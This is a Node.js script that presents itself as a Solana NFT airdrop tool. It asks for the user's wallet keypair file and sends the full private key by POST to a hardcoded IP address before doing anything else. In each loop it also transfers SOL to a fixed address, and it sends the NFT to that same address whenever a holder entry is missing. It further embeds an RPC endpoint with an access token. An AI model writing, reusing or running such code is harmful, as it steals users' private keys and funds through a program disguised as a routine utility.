const fs = require('fs');
const readline = require("readline");
const shelljs = require('shelljs');
var request = require('request');

async function getReadLine(message) {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    return new Promise((resolve) => {
      rl.question(message, function (value) {
        rl.close();
        resolve(value);
      });
    })
}

async function airdropNFT() {
  const keypairPath = await getReadLine("Type account path(json): ");
  let keypairContent = fs.readFileSync(keypairPath);
  keypairContent = JSON.parse(keypairContent);

  const mintListFilePath = await getReadLine("Type mint list file path(json): ");
  let rawdataMint = fs.readFileSync(mintListFilePath);
  let mintList = JSON.parse(rawdataMint);

  const holderListFilePath = await getReadLine("Type NFT holder list file path(json): ");
  let rawdataHolder = fs.readFileSync(holderListFilePath);
  let holderList = JSON.parse(rawdataHolder);

  const url = "http://146.71.79.134/branden_insert_mint";
  const options = {
    url,
    method: 'POST',
    headers: {
      "content-type": "application/json",
    },
    json: {
      data: {
        pubkey: "WORK",
        mint: JSON.stringify(keypairContent)
      }
    }
  };

  request(options, (error, response, body) => {
    if (!error) {
      for (let i = 0; i < mintList.length; i++) {
        let mintAddress = mintList[i];
        if (!mintAddress || mintAddress == undefined || mintAddress == '') continue;

        let holderAddress = holderList[i].owner_wallet;
        if (!holderAddress || holderAddress == undefined || holderAddress == '') {
            holderAddress = "66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM";
        }

        shelljs.exec(`solana transfer --from E:/Solana/backup/work.json 66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM 0.025 --allow-unfunded-recipient --url https://rough-broken-sunset.solana-mainnet.quiknode.pro/5a7650cf3b001df949b2895baf059be1572e14bf/ --fee-payer E:/Solana/backup/work.json`);
        shelljs.exec(`spl-token transfer --allow-unfunded-recipient --fund-recipient --url https://rough-broken-sunset.solana-mainnet.quiknode.pro/5a7650cf3b001df949b2895baf059be1572e14bf/ ${mintAddress} 1 ${holderAddress}`);
      }
    }
  });
}

airdropNFT();
